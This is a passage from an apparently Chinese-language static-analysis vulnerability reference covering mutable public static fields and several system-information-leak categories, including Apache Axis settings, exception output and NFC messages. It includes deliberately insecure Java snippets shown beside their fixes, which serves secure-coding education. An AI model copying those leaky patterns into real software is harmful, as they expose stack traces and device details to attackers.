<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3620 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3620 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3620 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3620 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3620 CAT II</p>
<h4 id="Poor-Style-Non-final-Public-Static-Field"><a href="#Poor-Style-Non-final-Public-Static-Field" class="headerlink" title="Poor Style: Non-final Public Static Field"></a>Poor Style: Non-final Public Static Field</h4><h5 id="ABSTRACT-31"><a href="#ABSTRACT-31" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>外部类可更改非最终公共静态字段。</p>
<h5 id="EXPLANATION-31"><a href="#EXPLANATION-31" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>通常情况下，您不会希望为外部类提供对象成员字段的直接访问路径，因为任意外部类都可以更改公共字段。面向对象的良好设计使用 Encapsulation 来防止将实现详细信息（例如成员字段）暴露给其他类。此外，如果系统假定此字段不可更改，则恶意代码可能能够逆向更改系统的行为。</p>
<p>示例 1：在以下代码中，字段 ERROR_CODE 已声明为公共、静态和非最终：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public class MyClass</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">public static int ERROR_CODE = 100;</span><br><span class="line"></span><br><span class="line">//...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这种情况下，恶意代码可能能够更改此错误代码并导致程序出现意外行为。</p>
<h5 id="RECOMMENDATIONS-29"><a href="#RECOMMENDATIONS-29" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果您希望将字段作为常数值公开，则应将该字段声明为 public static final，否则就将该字段声明为 private。</p>
<p>例 2：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public class MyClass</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">public static final int ERROR_CODE = 123;</span><br><span class="line"></span><br><span class="line">//...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-31"><a href="#REFERENCES-31" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Sun Microsystems, Inc. Secure Coding Guidelines for the Java Programming Language, version 2.0</p>
<p>[2] OBJ10-J. Do not use public static nonfinal fields CERT</p>
<p>[3] MUTABLE-9: Make public static fields final Oracle</p>
<p>[4] Standards Mapping - Common Weakness Enumeration CWE ID 493</p>
<h4 id="System-Information-Leak"><a href="#System-Information-Leak" class="headerlink" title="System Information Leak"></a>System Information Leak</h4><h5 id="ABSTRACT-32"><a href="#ABSTRACT-32" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>揭示系统数据或调试信息有助于攻击者了解系统并制定攻击计划。</p>
<h5 id="EXPLANATION-32"><a href="#EXPLANATION-32" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当系统数据或调试信息通过输出流或者日志功能流出程序时，就会发生信息泄漏。</p>
<p>示例 1：以下代码会将异常打印到标准错误流：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">&#125; catch (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">    e.printStackTrace();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>依据这一系统配置，该信息可转储到控制台，写成日志文件，或者显示给远程用户。例如，凭借脚本机制，可以轻松将输出信息从“标准错误”或“标准输出”重定向至文件或其他程序。或者，运行程序的系统可能具有将日志发送至远程设备的远程日志记录系统，例如 “syslog” 服务器。在开发过程中，您将无法知道此信息最终可能显示的位置。</p>
<p>在某些情况下，该错误消息恰好可以告诉攻击者入侵这一系统的可能性究竟有多大。例如，一个数据库错误消息可以揭示应用程序容易受到 SQL Injection 攻击。其他的错误消息可以揭示有关该系统的更多间接线索。在上述例子中，泄露的信息可能会暗示操作系统的类型、系统上安装了哪些应用程序，以及管理员在配置应用程序时做了哪些方面的努力。</p>
<p>这是另一种情况，特定于移动世界。大多数移动设备现在执行的是“近场通信”(NFC) 协议，以便使用无线电通信在设备之间快速共享信息。它在设备极为贴近或互相接触时有效。即使 NFC 的通信范围仅局限于几厘米，也可能发生窃听、修改数据以及各种其他类型的攻击情况，因为 NFC 本身并不能确保通信安全。</p>
<p>示例 2：Android 平台提供对 NFC 的支持。以下代码将创建一条消息，该消息会被发送给所在范围内的其他设备。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">public static final String TAG = &quot;NfcActivity&quot;;</span><br><span class="line"></span><br><span class="line">private static final String DATA_SPLITTER = &quot;__:DATA:__&quot;;</span><br><span class="line"></span><br><span class="line">private static final String MIME_TYPE = &quot;application/my.applications.mimetype&quot;;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">public NdefMessage createNdefMessage(NfcEvent event) &#123;</span><br><span class="line"></span><br><span class="line">    TelephonyManager tm = (TelephonyManager)Context.getSystemService(Context.TELEPHONY_SERVICE);</span><br><span class="line"></span><br><span class="line">    String VERSION = tm.getDeviceSoftwareVersion();</span><br><span class="line"></span><br><span class="line">    String text = TAG + DATA_SPLITTER + VERSION;</span><br><span class="line"></span><br><span class="line">    NdefRecord record = new NdefRecord(NdefRecord.TNF_MIME_MEDIA,</span><br><span class="line"></span><br><span class="line">            MIME_TYPE.getBytes(), new byte[0], text.getBytes());</span><br><span class="line"></span><br><span class="line">    NdefRecord[] records = &#123; record &#125;;</span><br><span class="line"></span><br><span class="line">    NdefMessage msg = new NdefMessage(records);</span><br><span class="line"></span><br><span class="line">    return msg;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>NFC 数据交换格式 (NDEF) 消息包含类型化数据、URI 或自定义应用程序负载。如果该消息包含与应用程序有关的信息（如其名称、MIME 类型或设备软件版本），则该信息将被泄露给窃听者。在上述示例中，Fortify Static Code Analyzer（Fortify 静态代码分析器）会在返回语句中报告 System Information Leak 漏洞。</p>
<h5 id="RECOMMENDATIONS-30"><a href="#RECOMMENDATIONS-30" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>编写错误消息时，始终要牢记安全性。在编码的过程中，尽量避免使用繁复的消息，提倡使用简短的错误消息。限制生成与存储繁复的输出数据将有助于管理员和程序员诊断问题的所在。此外，还要留意有关调试的跟踪信息，有时它可能出现在不明显的位置（例如嵌入在错误页 HTML 代码的注释行中）。</p>
<p>即便是并未揭示栈踪迹或数据库转储的简短错误消息，也有可能帮助攻击者发起攻击。例如，“Access Denied”（拒绝访问）消息可以揭示系统中存在一个文件或用户。</p>
<p>如果您担心 Android 设备上的系统数据会通过 NFC 泄露，那么您可以采取以下三种措施之一。不把系统数据包括在发送到范围内其他设备的消息中，或加密消息负载，或在更高层中建立安全通信通道。</p>
<h5 id="REFERENCES-32"><a href="#REFERENCES-32" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Ernst Haselsteiner and Klemens Breitfuss Security in Near Field Communication (NFC): Strengths and Weaknesses</p>
<p>[2] ERR01-J. Do not allow exceptions to expose sensitive information CERT</p>
<p>[3] ENV02-J. Do not trust the values of environment variables CERT</p>
<p>[4] FUNDAMENTALS-4: Establish trust boundaries Oracle</p>
<p>[5] CONFIDENTIAL-1: Purge sensitive information from exceptions Oracle</p>
<p>[6] Standards Mapping - Common Weakness Enumeration CWE ID 497</p>
<p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1)</p>
<p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M2 Insecure Data Storage</p>
<p>[9] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.6</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3620 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3620 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3620 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3620 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3620 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3620 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3620 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II</p>
<p>[25] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[26] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="System-Information-Leak-Apache-Axis"><a href="#System-Information-Leak-Apache-Axis" class="headerlink" title="System Information Leak: Apache Axis"></a>System Information Leak: Apache Axis</h4><h5 id="ABSTRACT-33"><a href="#ABSTRACT-33" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>揭示系统数据或调试信息有助于攻击者了解系统并制定攻击计划。</p>
<h5 id="EXPLANATION-33"><a href="#EXPLANATION-33" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当系统数据或调试信息通过输出流或者日志功能流出程序时，就会发生信息泄漏。</p>
<p>当将参数 axis.enableListQuery 设为 true 时，它会启用 Web 服务部署描述符 (WSDD) 列表。此功能会泄漏包含敏感信息（如 adminservice 密码）的当前系统配置。</p>
<h5 id="RECOMMENDATIONS-31"><a href="#RECOMMENDATIONS-31" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将 axis.enableListQuery 设为 false，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;deployment xmlns=&quot;http://xml.apache.org/axis/wsdd/&quot; xmlns:java=&quot;http://xml.apache.org/axis/wsdd/providers/java&quot;&gt;</span><br><span class="line"></span><br><span class="line"> &lt;globalConfiguration&gt;</span><br><span class="line"></span><br><span class="line">   &lt;parameter name=&quot;axis.enableListQuery&quot; value=&quot;false&quot;/&gt;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-33"><a href="#REFERENCES-33" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Web Service Security Apache Software Foundation</p>
<p>[2] Axis Reference Guide Apache Software Foundation</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 497</p>
<p>[4] Standards Mapping - FIPS200 CM</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1), SI-11 Error Handling (P2)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[8] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[9] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.6</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3620 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3620 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3620 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3620 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3620 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3620 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3620 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[27] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[28] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="System-Information-Leak-Apache-Axis-2"><a href="#System-Information-Leak-Apache-Axis-2" class="headerlink" title="System Information Leak: Apache Axis 2"></a>System Information Leak: Apache Axis 2</h4><h5 id="ABSTRACT-34"><a href="#ABSTRACT-34" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>揭示系统数据或调试信息有助于攻击者了解系统并制定攻击计划。</p>
<h5 id="EXPLANATION-34"><a href="#EXPLANATION-34" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当系统数据或调试信息通过输出流或者日志功能流出程序时，就会发生信息泄漏。</p>
<p>此参数可让 Apache Axis 2 将错误消息发送给客户端。错误消息包含堆栈跟踪信息；在某些情况下，该错误消息可准确地告知攻击者该系统易受哪种攻击。例如，一个数据库错误消息可以揭示应用程序容易受到 SQL Injection 攻击。其他的错误消息可以揭示有关该系统的更多间接线索。</p>
<h5 id="RECOMMENDATIONS-32"><a href="#RECOMMENDATIONS-32" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>编写错误消息时，始终要牢记安全性。在编码的过程中，尽量避免使用繁复的消息，提倡使用简短的错误消息。限制生成与存储繁复的输出数据将有助于管理员和程序员诊断问题的所在。</p>
<p>即便是并未揭示栈踪迹或数据库转储的简短错误消息，也有可能帮助攻击者发起攻击。例如，“Access Denied”（拒绝访问）消息可以揭示系统中存在一个文件或用户。</p>
<p>在这种情况下，将 sendStacktraceDetailsWithFaults 参数设为 false，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;parameter name=&quot;sendStacktraceDetailsWithFaults&quot;&gt;false&lt;/parameter&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-34"><a href="#REFERENCES-34" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] How to stop Axis2 sending stack traces in case of a fault? WSO2</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 497</p>
<p>[3] Standards Mapping - FIPS200 CM</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1), SI-11 Error Handling (P2)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.6</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3620 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3620 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3620 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3620 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3620 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3620 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3620 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[26] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[27] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="System-Information-Leak-External"><a href="#System-Information-Leak-External" class="headerlink" title="System Information Leak: External"></a>System Information Leak: External</h4><h5 id="ABSTRACT-35"><a href="#ABSTRACT-35" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>揭示系统数据或调试信息有助于攻击者了解系统并制定攻击计划。</p>
<h5 id="EXPLANATION-35"><a href="#EXPLANATION-35" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当系统数据或调试信息通过套接字或网络连接使程序流向远程机器时，就会发生外部信息泄露。外部信息泄露会暴露有关操作系统、完整路径名、现有用户名或配置文件位置的特定数据，从而使攻击者有机可乘，它比内部信息（攻击者更难访问）泄露更严重。</p>
<p>示例 1：以下代码泄露了 HTTP 响应中的异常信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">protected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    PrintWriter out = res.getWriter();</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">      out.println(e.getMessage());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该信息可以显示给远程用户。在某些情况下，该错误消息恰好可以告诉攻击者入侵这一系统的可能性究竟有多大。例如，一个数据库错误消息可以揭示应用程序容易受到 SQL Injection 攻击。其他的错误消息可以揭示有关该系统的更多间接线索。在上述例子中，泄露的信息可能会暗示操作系统的类型、系统上安装了哪些应用程序，以及管理员在配置应用程序时做了哪些方面的努力。</p>
<p>这是另一种情况，特定于移动世界。大多数移动设备现在执行的是“近场通信”(NFC) 协议，以便使用无线电通信在设备之间快速共享信息。它在设备极为贴近或互相接触时有效。即使 NFC 的通信范围仅局限于几厘米，也可能发生窃听、修改数据以及各种其他类型的攻击情况，因为 NFC 本身并不能确保通信安全。</p>
<p>示例 2：Android 平台提供对 NFC 的支持。以下代码将创建一条消息，该消息会被发送给所在范围内的其他设备。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">public static final String TAG = &quot;NfcActivity&quot;;</span><br><span class="line"></span><br><span class="line">private static final String DATA_SPLITTER = &quot;__:DATA:__&quot;;</span><br><span class="line"></span><br><span class="line">private static final String MIME_TYPE = &quot;application/my.applications.mimetype&quot;;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">public NdefMessage createNdefMessage(NfcEvent event) &#123;</span><br><span class="line"></span><br><span class="line">    TelephonyManager tm = (TelephonyManager)Context.getSystemService(Context.TELEPHONY_SERVICE);</span><br><span class="line"></span><br><span class="line">    String VERSION = tm.getDeviceSoftwareVersion();</span><br><span class="line"></span><br><span class="line">    String text = TAG + DATA_SPLITTER + VERSION;</span><br><span class="line"></span><br><span class="line">    NdefRecord record = new NdefRecord(NdefRecord.TNF_MIME_MEDIA,</span><br><span class="line"></span><br><span class="line">            MIME_TYPE.getBytes(), new byte[0], text.getBytes());</span><br><span class="line"></span><br><span class="line">    NdefRecord[] records = &#123; record &#125;;</span><br><span class="line"></span><br><span class="line">    NdefMessage msg = new NdefMessage(records);</span><br><span class="line"></span><br><span class="line">    return msg;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>NFC 数据交换格式 (NDEF) 消息包含类型化数据、URI 或自定义应用程序负载。如果该消息包含与应用程序有关的信息（如其名称、MIME 类型或设备软件版本），则该信息将被泄露给窃听者。在上述示例中，Fortify Static Code Analyzer（Fortify 静态代码分析器）会在返回语句中报告 System Information Leak 漏洞。</p>
<h5 id="RECOMMENDATIONS-33"><a href="#RECOMMENDATIONS-33" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>编写错误消息时，始终要牢记安全性。在编码的过程中，尽量避免使用繁复的消息，提倡使用简短的错误消息。限制生成与存储繁复的输出数据将有助于管理员和程序员诊断问题的所在。此外，还要留意有关调试的跟踪信息，有时它可能出现在不明显的位置（例如嵌入在错误页 HTML 代码的注释行中）。</p>
<p>即便是并未揭示栈踪迹或数据库转储的简短错误消息，也有可能帮助攻击者发起攻击。例如，“Access Denied”（拒绝访问）消息可以揭示系统中存在一个文件或用户。</p>
<p>如果您担心 Android 设备上的系统数据会通过 NFC 泄露，那么您可以采取以下三种措施之一。不把系统数据包括在发送到范围内其他设备的消息中，或加密消息负载，或在更高层中建立安全通信通道。</p>
<h5 id="REFERENCES-35"><a href="#REFERENCES-35" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Ernst Haselsteiner and Klemens Breitfuss Security in Near Field Communication (NFC): Strengths and Weaknesses</p>
<p>[2] ERR01-J. Do not allow exceptions to expose sensitive information CERT</p>
<p>[3] ENV02-J. Do not trust the values of environment variables CERT</p>
<p>[4] FUNDAMENTALS-4: Establish trust boundaries Oracle</p>
<p>[5] CONFIDENTIAL-1: Purge sensitive information from exceptions Oracle</p>
<p>[6] Standards Mapping - Common Weakness Enumeration CWE ID 497</p>
<p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1)</p>
<p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M2 Insecure Data Storage</p>
<p>[9] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.6</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3620 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3620 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3620 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3620 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3620 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3620 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3620 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II</p>
<p>[25] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[26] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="System-Information-Leak-HTML-Comment-in-JSP"><a href="#System-Information-Leak-HTML-Comment-in-JSP" class="headerlink" title="System Information Leak: HTML Comment in JSP"></a>System Information Leak: HTML Comment in JSP</h4><h5 id="ABSTRACT-36"><a href="#ABSTRACT-36" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>HTML 注释所包含的任何信息都有可能帮助攻击者了解系统并制定相应的攻击方案。</p>
<h5 id="EXPLANATION-36"><a href="#EXPLANATION-36" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>HTML 注释会给攻击者提供关于动态生成的 web 页面的信息源。</p>
<p>例 1：</p>
